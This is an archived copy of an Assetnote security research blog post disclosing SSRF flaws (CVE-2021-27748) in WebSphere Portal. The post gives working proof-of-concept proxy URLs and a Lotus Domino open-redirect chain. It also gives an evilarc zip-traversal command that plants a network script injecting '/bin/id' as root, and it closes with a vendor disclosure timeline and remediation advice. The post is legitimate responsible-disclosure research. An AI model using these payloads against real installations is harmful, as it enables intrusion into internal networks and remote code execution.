---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-12-26_turning-bad-ssrf-to-good-ssrf-websphere-portal.md
original_filename: 2021-12-26_turning-bad-ssrf-to-good-ssrf-websphere-portal.md
title: 'Turning bad SSRF to good SSRF: Websphere Portal'
category: documents
detected_topics:
- ssrf
- sso
- access-control
- command-injection
- file-upload
- path-traversal
tags:
- imported
- documents
- ssrf
- sso
- access-control
- command-injection
- file-upload
- path-traversal
language: en
raw_sha256: efc856b2c48576256a92fe80ab13d089858b70835651310d0786d24138c86993
text_sha256: c169dcb8fbb8995b678c0c8553b3c71e50e9b55bf77a46f3e3599e643345ee85
ingested_at: '2026-06-28T07:32:09Z'
sensitivity: unknown
redactions_applied: false
---

# Turning bad SSRF to good SSRF: Websphere Portal

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-12-26_turning-bad-ssrf-to-good-ssrf-websphere-portal.md
- Source Type: markdown
- Detected Topics: ssrf, sso, access-control, command-injection, file-upload, path-traversal
- Ingested At: 2026-06-28T07:32:09Z
- Redactions Applied: False
- Raw SHA256: `efc856b2c48576256a92fe80ab13d089858b70835651310d0786d24138c86993`
- Text SHA256: `c169dcb8fbb8995b678c0c8553b3c71e50e9b55bf77a46f3e3599e643345ee85`


## Content

---
title: "Turning bad SSRF to good SSRF: Websphere Portal"
page_title: "Turning bad SSRF to good SSRF: Websphere Portal (CVE-2021-27748)"
url: "https://blog.assetnote.io/2021/12/26/chained-ssrf-websphere/"
final_url: "https://www.assetnote.io/resources/research/turning-bad-ssrf-to-good-ssrf-websphere-portal-cve-2021-27748"
authors: ["Shubham Shah (@infosec_au)"]
programs: ["HCL Technologies"]
bugs: ["SSRF"]
publication_date: "2021-12-26"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3060
---

[Research Notes](/resources/research)

Security Research

December 26, 2021

# Turning bad SSRF to good SSRF: Websphere Portal (CVE-2021-27748)

No items found.

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/653795bb35bc995a6f921d3f_citrixbleed.svg)

Creative Commons license

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a358da60ce224014a578f4_homer-ssrf.jpeg)

 _Chaining redirects to request arbitrary URLs_

  * [Intro](https://blog.assetnote.io/2021/12/26/chained-ssrf-websphere/#intro)
  * [Understanding the Flow](https://blog.assetnote.io/2021/12/26/chained-ssrf-websphere/#flow)
  * [What is Websphere Portal?](https://blog.assetnote.io/2021/12/26/chained-ssrf-websphere/#hcl)
  * [Setting Up](https://blog.assetnote.io/2021/12/26/chained-ssrf-websphere/#setting-up)
  * [Finding a “bad” SSRF](https://blog.assetnote.io/2021/12/26/chained-ssrf-websphere/#bad-ssrf)
  * [Discovering the Redirect Gadget (Lotus Domino)](https://blog.assetnote.io/2021/12/26/chained-ssrf-websphere/#redirect-gadget)
  * [Discovering the Variants](https://blog.assetnote.io/2021/12/26/chained-ssrf-websphere/#variants)
  * [PoCs](https://blog.assetnote.io/2021/12/26/chained-ssrf-websphere/#pocs)
  * [Failing to Find A Chain: XXE](https://blog.assetnote.io/2021/12/26/chained-ssrf-websphere/#xxe)
  * [Bonus: Post auth RCE via Zip Based Directory Traversal](https://blog.assetnote.io/2021/12/26/chained-ssrf-websphere/#bonus)
  * [Vendor Response](https://blog.assetnote.io/2021/12/26/chained-ssrf-websphere/#vendor-response)
  * [Remediation Advice](https://blog.assetnote.io/2021/12/26/chained-ssrf-websphere/#remediation)
  * [Conclusion](https://blog.assetnote.io/2021/12/26/chained-ssrf-websphere/#conclusion)

The advisory for this issue can be found [here](https://blog.assetnote.io/2021/12/25/advisory-websphere-portal/).

The CVE for this issue is CVE-2021-27748. The advisory from HCL technologies can be found [here](https://support.hcltechsw.com/csm?id=kb_article&sysparm_article=KB0095665).

## Introduction

Server side request forgery occurs when you are able to coerce a server into making requests to arbitrary resources on your behalf. SSRF vulnerabilities pose a significant risk to attack surfaces as they allow attackers to access resources on the internal network.

On cloud environments, such as AWS, this risk is amplified due to the ability to reach the AWS Metadata server, which often allows for the retrieval of temporary AWS credentials tied to the server making the request. These temporary credentials are often keys to the kingdom.

Over the last few years, we have noticed a trend in SSRF vulnerabilities where they exploit a secondary service through open URL redirects. Our observations have been reflected in source code we have audited and in the wild.

Most notably, a vulnerability was disclosed in [Grafana](https://rhynorater.github.io/CVE-2020-13379-Write-Up) which exploited a URL redirect in <span class="code_single-line">secure.gravatar.com</span> and <span class="code_single-line">i0.wp.com</span> to achieve a full read unauthenticated SSRF.

In this blog post, we will explain how we discovered a multitude of SSRF vulnerabilities in HCL Websphere, as well as how we turned a restrictive, bad SSRF to a good SSRF.

## Understanding the Flow

The core concept of turning a bad SSRF to a good SSRF, relies on a few things:

  1. Analyzing the HTTP client being used and the capabilities (i.e. can it follow redirects?)
  2. Discovering a redirect gadget (i.e. an endpoint which allows you to redirect the request to an arbitrary URL)
  3. Smuggling the redirect gadget in your original SSRF payload (i.e. can your SSRF payload reach the redirection endpoint in a meaningful way?)

Click to open the diagram in a new tab.

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a358da9266029aee717add_second-order-ssrf.png)

## What is Websphere Portal?

As per Wikipedia: “WebSphere Portal is an enterprise software used to build and manage web portals. It provides access to web content and applications, while delivering personalized experiences for users. The WebSphere Portal package is a component of WebSphere application software.”

Originally Websphere Portal was owned by IBM, however in 2019, IBM sold Websphere Portal to HCL Technologies, which continue to maintain this product til this day rebranded as HCL Digital Experience.

Websphere Portal is heavily deployed across medium-large enterprise organizations, with heavy adoption in the government and banking sector. There are approximately ~3000 instances of WebSphere Portal on the external internet at the time of writing this blog post.

## Setting Up

As discussed in my presentation [Code Review: The Offensive Security Way](https://www.youtube.com/watch?v=fb-t3WWHsMQ), these days a big part of the journey is simply gaining access to the source code of these enterprise products we wish to audit.

Thankfully for WebSphere Portal, it was as simple as running a Docker image, found on Docker Hub:
  
  
  docker run -p 127.0.0.1:30015:30015 ibmcom/websphere-portal:latest
  
  

Once we’ve got a locally running instance of Websphere Portal, we can start digging into the files on the system and kick off our decompilation processes.

We can simply archive all the JAR files on the system by running the following command when inside a bash shell in the container:
  
  
  find . -type f -name \*.jar -exec tar rf /tmp/outfile2.tar {} \;
  
  

Then we simply <span class="code_single-line">docker cp</span> the <span class="code_single-line">tar</span> file from the container to our local system.

Using [procyon](https://github.com/ststeiger/procyon) we can then decompile all of these JAR files at once, using the following command:
  
  
  find . -type f -name '*.jar' | xargs -n 1 -P 20 -I {} procyon-decompiler -o decompiled2 {}
  
  

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a358daa178a0fb1b86b1a2_decompile-jars.png)

_Decompiling a lot of JAR files at once_

‍  

While we are investigating the file system, we perform the most critical step in our recon process, which is identifying the attack surface (routes/sources):
  
  
  grep -anril ''
  grep -anril '
  

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a358da9266029aee717b0d_servlet-mappings.png)

_So many servlets!_

  

Now that we’ve collected all of this information for Websphere Portal, we’re now in a position to continue our journey down the rabbit hole.

## Finding a “bad” SSRF

When reading through the mappings obtained in the previous step, we found something that seemed extremely naive and frankly, we couldn’t understand why it existed in the first place.

<span class="code_single-line">PortalServer/base/wp.proxy.config/installableApps/wp.proxy.config.ear/wp.proxy.config.war/WEB-INF/proxy-config.xml</span>

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a358da43a1b43a197cb1c5_mapping-1.png)

_proxy-config.xml in wp.proxy.config.ear_

  

Yes. You are reading it right.

This mapping allows users to reach <span class="code_single-line">http://www.ibm.com/*</span>, <span class="code_single-line">http://www-03.ibm.com/*</span> and <span class="code_single-line">http://www.redbooks.ibm.com/*</span> via the following paths:
  
  
  /wps/proxy/http/www.redbooks.ibm.com
  /wps/myproxy/http/www.redbooks.ibm.com
  /wps/common_proxy/http/www.redbooks.ibm.com
  /wps/cmis_proxy/http/www.redbooks.ibm.com
  
  

The concept of a web proxy system that was deployed by default, yet limited to a small number of “trusted” sites, did not sit well with us. Now knowing these constraints, we worked on turning this “bad” SSRF into a “good” one.

## Discovering the Redirect Gadget (Lotus Domino)

We spent some time trying to find a redirect on <span class="code_single-line">http://www.ibm.com/*</span> and <span class="code_single-line">http://www-03.ibm.com/*</span>, however we were unsuccessful.

Instead, we shifted focus to the third item in the whitelist: <span class="code_single-line">http://www.redbooks.ibm.com/*</span>.

Upon investigating this endpoint, we realized that it was running Lotus Domino to deliver content to users. As all good hackers do, we turned to ancient documentation on the operations and functionalities of Lotus Domino.

In particular, we looked for documentation that detailed the sign-on and sign-out flows, as we felt that it would be most likely that a redirection to an arbitrary URL would occur at such a stage.

Our hunch about redirection flows in Lotus Domino paid off, as we discovered the following documentation:

<https://help.hcltechsw.com/dom_designer/9.0.1/appdev/H_ABOUT_URL_COMMANDS_FOR_REQUIRING_AUTHENTICATION.html>

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a358da0e4952dc03815c5f_lotus-redir.png)

_This is pretty convenient, lol_

  

  
  
  http://www.lotus-10.com/sessions.nsf?logout&redirectto=/logoutDB.nsf/logoutApp?Open
  http://www.lotus-10.com/sessions.nsf?logout&redirectto=/logoutDB.nsf/logoutApp?OpenPage
  http://www.lotus-10.com/sessions.nsf?logout&redirectto=http://www.sales.com
  
  

Turns out, you can slap on <span class="code_single-line">?Logout&RedirectTo=http://example.com</span> to any Lotus Domino page to cause a URL redirection to the URL specified in the <span class="code_single-line">RedirectTo</span> parameter.

Let us try this on the whitelisted endpoint: 

<span class="code_single-line">http://www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com:</span>

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a358da3e40a8695e85d2ab_lotus-redir-1.png)

_Reading the documentation paid off_

  

Putting it all together, we end up with the following payload:
  
  
  http://127.0.0.1:30015/wps/proxy/http/www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com
  
  

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a358da4b373885b6500004_ws-ssrf-1.png)

_We have lift off_

  

When venturing deeper into the applications flow, we also noticed another route to /wps/proxy:
  
  
  /wps/contenthandler/!ut/p/digest!8skKFbWr_TwcZcvoc9Dn3g/?uri=http://www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com
  
  

We do not suggest deploying WAF rules to protect from this vulnerability due to the nature of Websphere Portal and how servlets can be accessed in various ways.

## Discovering the Variants

When taking a look at the attack surface of Websphere Portal, we realised how large it was and how many different applications were deployed by default. Naturally, it made sense for us to hunt for other locations where a proxy-like functionality would be present.

We ran the following command to find other proxy configurations: <span class="code_single-line">find . -type f -name "proxy-config.xml"</span>

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a358dadfce87eef147fd56_variant-1.png)

_Discovered exploitable variants_

  

This variant had the following configuration file:
  
  
  <proxy-rules xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://www.ibm.com/xmlns/prod/sw/http/outbound/proxy-config/2.0">
  <mapping contextpath="/proxy" url="*" name="proxy"/>
  <policy url="*" name="bc">
  <actions>
  <method>GET</method>
  <method>HEAD</method>
  <method>POST</method>
  <method>PUT</method>
  <method>DELETE</method>
  </actions>
  
  

This SSRF had the most impact out of all of the SSRFs discovered when auditing Websphere Portal. It allows you to proxy to an arbitrary URL by default, with any of the above HTTP methods.

The following headers are also proxied:
  
  
  <headers>
  <header>x-lfn-url-callback</header>
  <header>User-Agent</header>
  <header>Accept*</header>
  <header>Vary</header>
  <header>Location</header>
  <header>Content*</header>
  <header>Authorization*</header>
  <header>X-Method-Override</header>
  <header>Set-Cookie</header>
  <header>If-Modified-Since</header>
  <header>If-None-Match</header>
  <header>X-Server</header>
  <header>X-Update-Nonce</header>
  <header>X-Requested-With</header>
  <header>com.ibm.lotus.openajax.virtualhost</header>
  </headers>
  
  

The full HTTP response is returned.

The PoC for this SSRF can be found below:
  
  
  http://127.0.0.1:30015/wps/PA_WCM_Authoring_UI/proxy/http/example.com
  http://127.0.0.1:30015/wps/PA_WCM_Authoring_UI/proxy/https/example.com
  
  

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a358daaaa0abee4d818975_ws-ssrf-2.png)

_To the moon_

  

The next variant was discovered at the following location:

<span class="code_single-line">WebSphere/wp_profile/installedApps/dockerCell/Quickr_Document_Picker.ear/qkr.docpicker.widgets.war/WEB-INF/web.xml</span>

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a358daf0f48972e777a76c_variant-2.png)

_More variants?!_

  

The <span class="code_single-line">common_proxy</span> route requires an open redirect chain explained earlier in the blog post to exploit:
  
  
  http://127.0.0.1:30015/docpicker/common_proxy/http/www.redbooks.ibm.com
  
  

However the <span class="code_single-line">internal_proxy</span> route does not require any redirect chains, the proxy works without a redirect gadget:
  
  
  http://127.0.0.1:30015/docpicker/common_proxy/http/www.redbooks.ibm.com
  
  

This allows for full read SSRF (pre-auth) limited to GET requests.

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a358daa8ed0038c2684a35_ws-ssrf-3.png)

_To mars?_

  

## PoCs
  
  
  GET full read SSRF:
  
  /docpicker/internal_proxy/https/example.com
  /docpicker/internal_proxy/http/example.com
  /docpicker/internal_proxy/https/127.0.0.1:9043/ibm/console
  /docpicker/internal_proxy/http/127.0.0.1:9100/aa
  
  Redirect chain - turning "bad" SSRF to "good" SSRF
  
  /docpicker/common_proxy/http/www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com
  /wps/proxy/http/www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com
  /wps/myproxy/http/www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com
  /wps/common_proxy/http/www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com
  /wps/cmis_proxy/http/www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com
  /wps/contenthandler/!ut/p/digest!8skKFbWr_TwcZcvoc9Dn3g/?uri=http://www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com
  
  Arbitrary HTTP method + body:
  
  /wps/PA_WCM_Authoring_UI/proxy/http/example.com
  /wps/PA_WCM_Authoring_UI/proxy/https/example.com
  
  

## Failing to Find A Chain: XXE

Upon finding all of these SSRF vulnerabilities, we felt that we could prove a greater impact if we could chain the vulnerability by exploiting local resources that run alongside Websphere Portal.

Digging through the vast attack surface for hours, we thought we had found an ideal candidate that should have allowed for XXE.

IBM Knowledge Centre is shipped in the Admin Console of IBM Websphere on port 9043. Through our SSRF we can access this port and hence this functionality.

The <span class="code_single-line">web.xml</span> file for IBM KC had the following:
  
  
  <filter>
  <filter-name>JsonpCallbackFilter</filter-name>
  <filter-class>com.ibm.kc.server.filter.JsonpCallbackFilter</filter-class>
  </filter>
  <filter-mapping>
  <filter-name>JsonpCallbackFilter</filter-name>
  <url-pattern>/api/webfeed</url-pattern>
  </filter-mapping>
  
  

As a result, we downloaded the <span class="code_single-line">kc.war</span> file to our local system and started reverse engineering it:
  
  
  docker cp 7b10e70c3328:/opt/IBM/WebSphere/wp_profile/config/cells/dockerCell/applications/isclite.ear/deployments/isclite/kc.war .
  
  

In our decompiler we located the code for <span class="code_single-line">/webfeed</span>:

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a358dae9566eaa8f267bcf_kc.png)

_kc.war decompiled_

  

Tracing the flow of this route, we found the following code that handled reading XML:

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a358db9764b44807596136_kc2.png)

_Bingo?!_

  

We were stoked to have found an exploit chain that allowed for XXE, however when attempting it on a live target, we noticed the following behaviour:

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a358da38d9a131ef387ae8_kc3.png)

_Has it been patched? Please don’t tell us it’s been patched._

‍  

When auditing vendor software and relying on sparse images available on Docker Hub, we realised that we may be auditing an out of date version of Websphere Portal.

We went searching for a newer version of this software and found a more recent Docker Image with only WebSphere app server (not portal): https://hub.docker.com/r/ibmcom/websphere-traditional/

It included the knowledge center, so we attempted our exploit on this newer version which resulted in the following:

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a358daeb44abcacbab917d_kc4.png)

_Looks like it’s patched in newer versions_

  

We pulled down the <span class="code_single-line">kc.war</span> file and decompiled it. We found that the route/functionality had been deprecated:

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a358da43abf51951f7414d_kc5.png)

_All good things come to an end_

  

While we weren’t successful at finding an exploit chain on the latest version of Websphere Portal, we wanted to share the valuable lesson of always having the latest copy of source code available to avoid situations like the one we found ourselves in.

This is sometimes not possible for vendor software, where you can barely get a copy of the source code, let alone the latest version.

Nonetheless, this exploit chain is still valid on older versions of Websphere Portal, however we have not been successful at exploiting it in the wild.

## Bonus: Post auth RCE via Zip Based Directory Traversal

While we’re on the topic of hacking Websphere Portal, we wanted to share a post-authentication RCE vector.

There is a functionality to upload script applications to WebSphere Portal once you are authenticated. This allows you to upload a Zip file which should contain HTML/CSS/JS.

The extraction of this Zip file is vulnerable to directory traversal. This leads to arbitrary file upload anywhere on the system.

The steps to reach this functionality can be found below:

Login to WebSphere Portal -> Site Manager -> Add page components and applications -> Applications -> Script Application

Click Actions -> Import

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a358da3f5936fc7e7959e5_script-import.png)

 _Importing a Script Application_

  

At this stage, you will need to prepare your Zip exploit using Evilarc: https://github.com/ptoomey3/evilarc

Create a file <span class="code_single-line">lo-1.html</span> with the following contents. This will lead to RCE on reboot:
  
  
  NAME=Network /bin/id
  ONBOOT=yes
  DEVICE=eth0
  
  

Run the following command:
  
  
  python2 evilarc.py lo-1.html -o unix -f index6.zip -p etc/sysconfig/network-scripts/ -d 20
  
  Creating index6.zip containing ../../../../../../../../../../../../../../../../../../../../etc/sysconfig/network-scripts/lo-1.html
  
  

For context around why this attack vector is possible, you can read more about it [here](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).

If, for whatever reason, a user is able to write an <span class="code_single-line">ifcfg-<whatever></span> script to <span class="code_single-line">/etc/sysconfig/network-scripts<span> or it can adjust an existing one, then RCE is possible.

Network scripts, ifcfg-eth0 for example are used for network connections. The look exactly like .INI files. However, they are ~sourced~ on Linux by Network Manager (dispatcher.d).

In our case, the NAME= attributed in these network scripts is not handled correctly. If you have white/blank space in the name the system tries to execute the part after the white/blank space. Which means; everything after the first blank space is executed as root.

## Vendor Response

We attempted to disclose these issues to the current owner of Websphere Portal - HCL Technologies.

We reported all of the issues in this blog post on Sept 5th, 2021, with a 90 day policy for disclosure.

The timeline for this disclosure process can be found below:

  * **Sept 5th, 2021** : Disclosure of SSRFs and Post Auth RCE (6 reports)
  * **Sept 7th, 2021** : Initial response from HCL Technologies stating that the reports have been submitted to product teams
  * **Oct 5th, 2021** : Sent a reminder that 30 days have lapsed and 60 days remain as per our responsible disclosure policy
  * **Oct 5th, 2021** : Response stating that they will follow up with the team analyzing the vulnerabilities
  * **Nov 8th, 2021** : Sent a reminder that 60 days have lapsed and 30 days remain as per our responsible disclosure policy
  * **Nov 8th, 2021** : Response stating that they could not reproduce any of our findings, reminding us that we cannot claim CVEs for any of these issues as they are a CNA
  * **Nov 8th, 2021** : Sent a request for CVEs to HCL Technologies for the issues identified - received no response
  * **Nov 20th, 2021** : Sent another request for CVEs to HCL Technologies and reminded them that we will be publishing after the 90 day deadline (Dec 5th)
  * **Nov 23rd, 2021** : Response stating that CVEs wont be filed until remediation steps are available
  * **Nov 23rd, 2021** : Sent a reminder that we will be publishing after 90 day deadline, without CVEs available
  * **Nov 23rd, 2021** : Response stating that if we publish any information about these vulnerabilities, <span class="code_single-line">HCL technologies will cite you as in irresponsible vulnerability disclosure party to the communities that we post to</span>
  * **Nov 23rd, 2021** : Sent a reminder that we are following our 90 day disclosure policy as stated upon initial report
  * **Dec 3rd, 2021** : Asked if there was any progress on this vulnerability. Sent a reminder that 90 day deadline ends on Dec 5th

No response since Nov 23rd.

## Remediation Advice

We suggest that you modify all of the <span class="code_single-line">proxy-config.xml</span> files in your Websphere Portal installation so that no origins are whitelisted.

Additionally, if the functionality is not necessary for your installation of Websphere Portal, remove the following folders:

PortalServer/base/wp.proxy.config/installableApps/wp.proxy.config.earWebSphere/wp_profile/installedApps/dockerCell/Quickr_Document_Picker.earWebSphere/wp_profile/config/cells/dockerCell/applications/PA_WCM_Authoring_UI.ear

Do not rely on WAF rules to prevent exploitation of this issue. There are a number of ways to reach these endpoints that WAF rules may not sufficiently cover.

## Conclusion

Vendor software is often deployed on attack surfaces to achieve critical business needs and goals. In this day and age, in almost every attack surface we assess, we find vendor software such as Websphere Portal being used by enterprises.

Websphere Portal has been around since 2001 and it’s used by a large number of enterprises to this day. Even though this blog post details some critical flaws in this product, the attack surface is vast and diverse, there are many more vulnerabilities yet to be found.

If security due dilligence is not performed on deployed vendor software, it can inadvertently expose your attack surface to exploitation.

At Assetnote, our security research team has been focusing on reverse engineering vendor software and discovering these critical vulnerabilities before they are exploited by malicious actors. As a part of our [Attack Surface Management Platform](https://assetnote.io/), we scan for these vulnerabilities as soon as our team discover them.

Written by:

Shubham Shah

Your subscription could not be saved. Please try again. 

Your subscription has been successful. 

Get updates on our research

Subscribe to our newsletter and stay updated on the newest research, security advisories, and more!

Enter your email address to subscribe

Provide your email address to subscribe. For e.g abc@xyz.com 

SUBSCRIBE 

### More Like This

[Security ResearchNew!Doing the Due Diligence: Analyzing the Next.js Middleware Bypass (CVE-2025-29927)Read moreRead on ASN Blog](/resources/research/doing-the-due-diligence-analyzing-the-next-js-middleware-bypass-cve-2025-29927)

[Security ResearchNew!How an obscure PHP footgun led to RCE in Craft CMSRead moreRead on ASN Blog](/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms)

[Security ResearchNew!Citrix Denial of Service: Analysis of CVE-2024-8534Read moreRead on ASN Blog](/resources/research/citrix-denial-of-service-analysis-of-cve-2024-8534)

[Security ResearchNew!Nginx/Apache Path Confusion to Auth Bypass in PAN-OS (CVE-2025-0108)Read moreRead on ASN Blog](/resources/research/nginx-apache-path-confusion-to-auth-bypass-in-pan-os)

[Security ResearchNew!Leveraging An Order of Operations Bug to Achieve RCE in Sitecore 8.x - 10.xRead moreRead on ASN Blog](/resources/research/leveraging-an-order-of-operations-bug-to-achieve-rce-in-sitecore-8-x---10-x)

[Security ResearchNew!Insecurity through Censorship: Vulnerabilities Caused by The Great FirewallRead moreRead on ASN Blog](/resources/research/insecurity-through-censorship-vulnerabilities-caused-by-the-great-firewall)

[Back to All](/resources/research)

### Ready to get started?

Get on a call with our team and learn how Assetnote can change the way you secure your attack surface. We'll set you up with a trial instance so you can see the impact for yourself.

[Request a Demo](/demo)

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/64241df2676aeba82706ffe8_assetnote-logo.svg)

Address:  
Level 10, 12 Creek Street, Brisbane QLD, 4000  
‍  
Contact:  
[contact@assetnote.io  
  
](mailto:contact@assetnote.io)Press Inquiries:[  
](mailto:contact@assetnote.io)[press@assetnote.io](mailto:press@assetnote.io)

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/661f041240ed96ed7a03fe6f_61dc1beb212a1202fc512a76_SOC%202-03-p-500.png)

[](https://twitter.com/assetnote)[](https://www.linkedin.com/company/assetnote/)

Platform Features

[Continuous Asset Discovery](/platform/asset-discovery)

[Deep Asset Enrichment](/platform/asset-enrichment)

[Assetnote Exposure Engine](/platform/assetnote-exposure-engine)

[Expert Security Research](/platform/expert-security-research)

[Collaborative Workflows](/platform/collaborative-workflows)

[Customization](/platform/customization)

Use Cases

[Continuous Asset Discovery and Inventory](/use-cases/continuous-asset-discovery-and-inventory)

[Real-Time Exposure Monitoring](/use-cases/continuous-security-monitoring)

[Attack Surface Reduction](/use-cases/attack-surface-reduction)

[Mergers & Acquisitions](/use-cases/mergers-and-acquisitions)

[Bug Bounty Readiness](/use-cases/bug-bounty-readiness)

© 2026 Assetnote. All rights reserved.

[Privacy Policy](https://assetnote.io/policies/privacy-policy)
